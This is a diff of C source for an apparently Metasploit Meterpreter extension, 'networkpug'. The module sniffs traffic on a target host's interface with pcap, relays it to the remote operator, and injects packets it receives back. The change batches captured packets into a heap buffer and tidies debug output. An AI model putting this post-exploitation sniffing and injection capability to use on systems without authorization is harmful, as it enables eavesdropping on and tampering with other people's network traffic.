@@ -26,6 +26,9 @@ typedef struct networkpug {
 	Channel *channel;
 	Remote *remote;	
 
+	unsigned char *packet_stream;
+	size_t packet_stream_length;
+
 	// PKS, potential race with socket writing / shutdowns
 	// maybe ref count / spinlock via atomic instructions. need to think more :-)
 
@@ -41,37 +44,46 @@ LOCK *pug_lock;
 char *packet_filter;
 
 /*
- * PKS -- FIXME, we should do a single channel_write after pcap_dispatch has returned.
- */
-
-/*
  * send packet to remote channel
  */
 
 void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
 {
 	NetworkPug *np = (NetworkPug *)(user);
-	unsigned int total_len = h->caplen + 2;
-	unsigned char packet_data[total_len];			// 13a85fedd6f9555c31a921c0e5664228afcea9c5 ;)
-	unsigned short int *size = (unsigned short *)(packet_data);
+	size_t plussize = h->caplen + sizeof(u_int16_t);
+	u_int16_t *size;
+	unsigned char *tmp, *data;
 
 	if(! np->active) {
 		// begone, foul demon.
-		dprintf("[%s] breaking loop", __FUNCTION__);
+		dprintf("breaking loop");
 		pcap_breakloop(np->pcap);
 		return;
 	}
 
-	dprintf("[%s/%s] we have %d bytes to send to metasploit :-)", __FUNCTION__, np->interface, h->caplen);
+	dprintf("(%s) we have %d bytes to send to metasploit :-)", np->interface, h->caplen);
 
 	// PKS - this approach is quite hacky. A better implementation would be a record
 	// based stream, but that's a lot more work, plus would probably require significant
 	// changes on the ruby side.
 
-	*size = htons(h->caplen);
-	memcpy(&packet_data[2], bytes, h->caplen);
+	tmp = realloc(np->packet_stream, np->packet_stream_length + plussize + 4); // +4 - padding 
+	if(tmp == NULL) {
+		// memory issues? we could revert to stack, but let's drop it on the floor
+		// for now.
+		dprintf("memory constraint, dropping packet");
+		return;
+	}
+	np->packet_stream = tmp;
 
-	channel_write(np->channel, np->remote, NULL, 0, (PUCHAR) packet_data, total_len, NULL);
+	size = (unsigned short int *)(np->packet_stream + np->packet_stream_length);  
+	*size = htons(h->caplen);
+	data = (unsigned char *)(np->packet_stream + np->packet_stream_length + 2);
+
+	memcpy(data, bytes, h->caplen);
+
+	np->packet_stream_length += plussize;
+
 	__atomic_inc(&(np->pkts_seen));
 }
 
@@ -103,11 +115,20 @@ void networkpug_thread(THREAD *thread)
 
 		count = pcap_dispatch(np->pcap, 1000, packet_handler, (u_char *)np);
 
-		if(count)
-			dprintf("[%s] pcap_dispatch returned %d", __FUNCTION__, count);
+		if(count > 0) {
+			dprintf("pcap_dispatch returned %d", count);
+		}
+
+		if(np->packet_stream) {
+			channel_write(np->channel, np->remote, NULL, 0, (PUCHAR) np->packet_stream, np->packet_stream_length, NULL);
+
+			free(np->packet_stream);
+			np->packet_stream = NULL;
+			np->packet_stream_length = 0;
+		}
 
 	}
-	dprintf("[%s/%s] instructed to shutdown, thread exiting", __FUNCTION__, np->interface);
+	dprintf("[%s] instructed to shutdown, thread exiting", np->interface);
 }
 
 /*
@@ -137,12 +158,12 @@ void free_networkpug(NetworkPug *np, int close_channel, int destroy_channel)
 	int cont;
 
 	if(! np) {
-		dprintf("[%s] There's a bug somewhere. trying to free a null networkpug", __FUNCTION__);
+		dprintf("There's a bug somewhere. trying to free a null networkpug");
 		return;
 	}
 
-	dprintf("[%s] np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
-		__FUNCTION__, np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
+	dprintf("np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
+		np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
 		np->pcap);
 
 	/*
@@ -157,7 +178,7 @@ void free_networkpug(NetworkPug *np, int close_channel, int destroy_channel)
 	cont = __atomic_swap(0, &np->active);
 	
 	if(! cont) {
-		dprintf("[%s] Seems the pug at %p was already set free", __FUNCTION__);
+		dprintf("Seems the pug at %p was already set free");
 		return;
 	}
 
@@ -195,8 +216,8 @@ void free_networkpug(NetworkPug *np, int close_channel, int destroy_channel)
 
 	memset(np, 0, sizeof(NetworkPug));	
 
-	dprintf("after memset ;\\ [%s] np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
-		__FUNCTION__, np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
+	dprintf("after memset ;\\ np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
+		np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
 		np->pcap);
 
 }
@@ -205,7 +226,7 @@ NetworkPug *find_networkpug(char *interface)
 {
 	int idx;
 
-	dprintf("[%s] Looking for %s", __FUNCTION__, interface);
+	dprintf("Looking for %s", interface);
 
 	for(idx = 0; idx < MAX_PUGS; idx++) {
 		if(pugs[idx].active) 
@@ -222,11 +243,11 @@ DWORD networkpug_channel_write(Channel *channel, Packet *request,
 	NetworkPug *np = (NetworkPug *)(context);
 	DWORD result = ERROR_SUCCESS;
 
-	dprintf("[%s] context is %p", __FUNCTION__, context);
+	dprintf("context is %p", context);
 
 	if(! np->active) return result;
 
-	dprintf("[%s] if it's a pug, it's for %s", __FUNCTION__, np->interface);
+	dprintf("if it's a pug, it's for %s", np->interface);
 
 	pcap_inject(np->pcap, buffer, bufferSize);
 	*bytesWritten = bufferSize; // XXX, can't do anything if it fails really
@@ -246,14 +267,14 @@ DWORD networkpug_channel_close(Channel *channel, Packet *request, LPVOID context
 	np = (NetworkPug *)(context);
 
 	if(np->active) {
-		dprintf("[%s] Channel shutdown requested. context = %p", __FUNCTION__, context);
-		dprintf("[%s] pugs is at %p, and pugs[MAX_PUGS] is %p", __FUNCTION__, pugs, pugs + MAX_PUGS);
+		dprintf("Channel shutdown requested. context = %p", context);
+		dprintf("pugs is at %p, and pugs[MAX_PUGS] is %p", pugs, pugs + MAX_PUGS);
 
 		free_networkpug((NetworkPug *)(context), FALSE, FALSE);
 
-		dprintf("[%s] closed channel successfully", __FUNCTION__);
+		dprintf("closed channel successfully");
 	} else {
-		dprintf("[%s] Already closed down context %p", __FUNCTION__, context);
+		dprintf("Already closed down context %p", context);
 	}
 
 	lock_release(pug_lock);
@@ -287,14 +308,14 @@ DWORD request_networkpug_start(Remote *remote, Packet *packet)
 		extra_filter = packet_get_tlv_value_string(packet, TLV_TYPE_NETWORKPUG_FILTER);
 
 		if(! interface) {
-			dprintf("[%s] No interface specified, bailing", __FUNCTION__);
+			dprintf("No interface specified, bailing");
 			break;
 		
 		}
 
 		np = find_networkpug(interface);
 		if(np) {
-			dprintf("[%s] Duplicate pug found for %s!", __FUNCTION__, interface);
+			dprintf("Duplicate pug found for %s!", interface);
 			break;
 		}
 
@@ -321,7 +342,7 @@ DWORD request_networkpug_start(Remote *remote, Packet *packet)
 				final_filter = strdup(packet_filter);
 			}
 
-			dprintf("[%s] final filter is '%s'", __FUNCTION__, final_filter);
+			dprintf("final filter is '%s'", final_filter);
 
 			bpf_fail = pcap_compile(np->pcap, &bpf, final_filter, 1, 0);
 
@@ -332,15 +353,15 @@ DWORD request_networkpug_start(Remote *remote, Packet *packet)
 		}
 
 		if(! np->pcap || ! np->thread || ! np->channel || bpf_fail) {
-			dprintf("[%s] setting up network pug failed. pcap: %p, thread: %p, channel: %p, bpf_fail: %d",
-				 __FUNCTION__, np->pcap, np->thread, np->channel, bpf_fail);
+			dprintf("setting up network pug failed. pcap: %p, thread: %p, channel: %p, bpf_fail: %d",
+				 np->pcap, np->thread, np->channel, bpf_fail);
 
 			if(! np->pcap) {
-				dprintf("[%s] np->pcap is NULL, so errbuf is '%s'", __FUNCTION__, errbuf);
+				dprintf("np->pcap is NULL, so errbuf is '%s'", errbuf);
 			}
 
 			if(bpf_fail) {
-				dprintf("[%s] setting filter failed. pcap_geterr() == '%s'", __FUNCTION__, pcap_geterr(np->pcap));
+				dprintf("setting filter failed. pcap_geterr() == '%s'", pcap_geterr(np->pcap));
 			}
 
 			break;
@@ -381,20 +402,20 @@ DWORD request_networkpug_stop(Remote *remote, Packet *packet)
 		interface = packet_get_tlv_value_string(packet,TLV_TYPE_NETWORKPUG_INTERFACE);
 
 		if(! interface) {
-			dprintf("[%s] No interface specified, bailing", __FUNCTION__);
+			dprintf("No interface specified, bailing");
 			break;	
 		}
 
-		dprintf("[%s] Shutting down %s", __FUNCTION__, interface);
+		dprintf("Shutting down %s", interface);
 
 		np = find_networkpug(interface);	// if close is called, it will fail. 
 
 		if(np == NULL) {
-			dprintf("[%s/%s] Unable to find interface", __FUNCTION__, interface);
+			dprintf("[%s] Unable to find interface", interface);
 			break;
 		}
 
-		dprintf("[%s] calling free_networkpug", __FUNCTION__);
+		dprintf("calling free_networkpug");
 		free_networkpug(np, TRUE, FALSE);
 
 		result = ERROR_SUCCESS;
@@ -465,7 +486,7 @@ DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 			break;
 
 		default:
-			dprintf("[%s] Sorry it didn't work out :/ It's not you, it's me", __FUNCTION__);
+			dprintf("Sorry it didn't work out :/ It's not you, it's me");
 			return ERROR_INVALID_PARAMETER;
 	}
 
@@ -475,7 +496,7 @@ DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 			port
 	);
 
-	dprintf("[%s] so our filter is '%s'", __FUNCTION__, packet_filter);
+	dprintf("so our filter is '%s'", packet_filter);
 
 	for (index = 0;
 	     customCommands[index].method;
